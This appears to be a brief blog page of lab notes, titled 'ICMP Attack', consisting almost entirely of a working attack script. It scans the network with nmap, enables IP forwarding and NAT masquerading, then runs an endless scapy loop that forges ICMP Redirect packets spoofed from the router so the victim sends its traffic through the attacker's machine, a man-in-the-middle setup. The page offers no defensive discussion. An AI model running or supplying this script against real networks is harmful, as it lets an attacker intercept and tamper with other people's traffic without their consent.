---
title: 'ICMP'
description: 'ICMP Attack'
pubDate: 'May 12 2023'
heroImage: 'https://res.cloudinary.com/djc1umong/image/upload/v1688891572/0_xyytof.webp'
slug: 'icmp_attack'
---

```bash
# ver alcance de la red
ip route show dev eth1
nmap -sn -n 10.23.56.0/24 10.100.13.0/24
nmap -sCV -n 10.1
###
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o eth1 -j MASQUERADE

# CORREMOS scapy
scapy

### ICMP Redirect Script

originalRouterIP='10.100.13.1'
attackerIP='10.100.13.20'
victimIP='10.100.13.126'
serverIP='10.23.56.100'
# We create an ICMP Redirect packet
ip=IP()
ip.src=originalRouterIP
ip.dst=victimIP
icmpRedirect=ICMP()
icmpRedirect.type=5
icmpRedirect.code=1
icmpRedirect.gw=attackerIP
# The ICMP packet payload /should/ contain the original TCP SYN packet
# sent from the victimIP
redirPayloadIP=IP()
redirPayloadIP.src=victimIP
redirPayloadIP.dst=serverIP
fakeOriginalTCPSYN=TCP()
fakeOriginalTCPSYN.flags="S"
fakeOriginalTCPSYN.dport=80
fakeOriginalTCPSYN.seq=444444444
fakeOriginalTCPSYN.sport=55555
while True:
    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)

```
